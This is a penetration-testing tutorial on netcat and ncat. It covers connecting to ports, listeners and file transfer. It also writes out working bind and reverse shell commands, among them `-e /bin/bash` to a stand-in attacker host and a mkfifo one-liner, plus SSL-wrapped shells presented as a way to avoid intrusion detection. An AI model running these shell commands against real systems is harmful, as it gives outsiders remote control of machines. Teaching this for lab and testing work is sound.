# Netcat - the hacker's swiss army knife
![netcat](https://www.dropbox.com/s/um41q9zry0ktuo4/netcat_180.png?raw=1)

Is a tool that can read and write to TCP and UDP ports (can act as client or server).

Netcat is a tool used to:
* Check if port is open or close
* Read a banner from a port.
* To connect to a network service manually.

Netcat binary is present by default in Linux, Windows and MacOSX also if system administrators tend to remove it from the servers for obvious security reasons. 

## How to use netcat as client.
We have already scanned our target with nmap and we know that the following ports are open: 

```Nmap output
Nmap scan report for ************ (10.0.0.22)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
110/tcp  open  pop3
```
Let's try to connect to the port 110 

`netcat -nv 10.0.0.22 110`
```netcat output
(UNKNOWN)[10.0.0.22] 110 (pop3) open
+OK POP3 server lab ready 
```
In this case after the connection we got a welcome message from the server ( a "banner").

The parameters `-nv` used mean:
+ -n  I will give a numeric IP address and not an host address.  
+ -v  verbose mode. 

## How to use netcat as server (listener)

To listen with netcat on a TCP or UDP port we will set it up as server on our localhost and try to talk with it through another computer connected on the same network (or virtual machine).

`netcat -nlvp 444`
```output netcat server
listening on [any] 4444 ...
```
Explanation new parameters: 
+ -l listen mode (for inbound connections)
+ -p specify a port


We can connect to this port using the same command that we used before to use netcat as client from another machine.
I will use the address 10.0.0.22 as the server one.

`netcat -nv 10.0.0.22 4444`
```output ncat client
(UNKNOWN) [10.0.0.22] 4444 (?) open
I can write here and the server will be able to see ! 
Also, if I write in the server prompt the client will be able to see it ! 
Congratulation you created a chat ! 
```

## Transfer files with netcat 

Netcat can also be used to transfer file between a server and a client.

Set up the server that will receive:
`netcat -nlp 4444 > incoming.exe`

Set up the client that will send:
`netcat -n 10.0.0.22 4444 < file_to_transfer.exe`

Netcat will not give us any feedback, but the file will be in the specified folder. 
Check for file size matching before quitting the connection. 

## Remote administration with netcat
As we previously saw with netcat is possible to create a communication between a client and a server.
This textual exchange of messages can be used to do command redirection.
We can take an executable file and redirect the input, output, and error messages to a TCP/UDP port rather than the default console.
There are two tipes of connection that can be enstablished, and it's really important to understand when one rather than the other should be  used. 

### Bind shell 
A bind shell is enstablished when a server that has a public ip address opens a port to a client and binds a shell to that port.(fig.1)
So when the client connects to this public address on this port it will be welcomed with the server command prompt.

![bindshell](https://www.dropbox.com/s/ul38konoyhnx232/2017-12-01%2016.46.29.jpg?raw=1)

To create a bind shell the attacker should connect (as client) to the target (server).
The *target* will open a netcat session as server with a shell binded to it (es. from Windows):

`netcat -nlvp 4444 -e cmd.exe`

Parameters:
+ -e  execute

The *attacker* will then connect to the server and get command prompt access:
a.b.c.d is the public IP address of the server.
`# netcat -nv a.b.c.d 4444`
From now on, everything written on the attacker computer will be sent to cmd.exe on the target computer and the output redirected back to the attacker.



### Reverse shell

![reverseshell](https://www.dropbox.com/s/8uvared7qrkz9dv/2017-12-01%2017.02.28.jpg?raw=1)

To create a reverse shell the attacker is the server and the target will connect to it as client.
The *attacker* will create a server.
`netcat -nlvp 4444`

The *target* will connect to the server and bind a shell to the opne TCP port (es. from Linux):
a.b.c.d is the public IP address of the server 
`netcat -nv a.b.c.d -e /bin/bash`

### Conclusions.
Which type of connection should I use? 
If you are on a LAN, both method will work just fine. 
In a real scenario the computer to attack will be positioned inside a private network and the attacker will not be able to connect to it because some kind of firewall will block the incoming connection to that port ! 
Usually firewalls block incoming connection and not outgoing connections, this is why we should use a reverse shell.
A *reverse shell* allows to the target to connect to us (and we should have control on our router firewall) through our public IP. 

### Others infoz.
There are versions of netcat that don't have -e or -c options. 

A binding shell can be enstablished in this way:

* Server side: 
`rm -f /tmp/f; mkfifo /tmp/f`
`cat /tmp/f |/bin/bash -i 2>&1 |nc -l a.b.c.d PORT>/tmp/f `

* Client side:
`nc a.b.c.d PORT`


## ncat and encrypted link between a server and a client (SSL)
[ncat](https://nmap.org/ncat/) was written for the nmap project as a much-improved reimplementation of netcat.
Ncat is able to enstablish end-to-end encrypted connections between a client and a server (SSL), redirect TCP and UDP ports to other sites, proxy connections via SOCKS4 or HTTP proxies. 

### Use ncat with SSL to encrypt your bind or reverse shell.

Encryption of the bind or reverse shell will help the penetration tester in avoiding intrusion detection systems (IDS), and will allow to not expose penetrated machines to unwanted IPs. 

To set up a bind shell with SSL encryption: 

* SERVER
  `ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl`

   options explained:
     + --exec used to specify the executable file (in this case a windows command prompt).
     + --allow specify the IP of the client that is allowed to connect with the server.
     + --ssl  activate ssl encryption of the connections. 

+ CLIENT
   `ncat -v 10.0.0.22 4444 --ssl`


Now all the data exchanged between the server and the client is protected by SSL (Secure Sockets Layer). 


### ncat - connect to an HHTPS website

`ncat -v --ssl google.com 443`

### ncat - forward a local port
ncat -vl 7777 -c `ncat remote_host 8080`

### ncat - connect through a proxy
`ncat --proxy proxy_server:port --proxy-type {socks4|http} remote_host port [--proxy-auth username:password ] 
(Proxies that return status code 407 require authentication)

### ncat - create an HHTP proxy
`ncat -vl --proxy-type http 7777 [--allow 123.45.67.89 --proxy-auth user:pass]`

### ncat - Configure access controls for listening sockets
```
ncat -vl 7777 {--allow|--deny}  remotehost
ncat -vl 7777 {--allow|--deny}  10.0.0.10
ncat -vl 7777 {--allow|--deny}  10.0.0.10,10.0.0.20
ncat -vl 7777 {--allow|--deny}  10.0.0.10-20
ncat -vl 7777 {--allow|--deny}  10.0.0.0/24
ncat -vl 7777 {--allow-file|--deny-file} hosts.txt
```

## BONUS

* [Netcat Cheatsheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
* [ncat user guide](https://nmap.org/ncat/guide/)
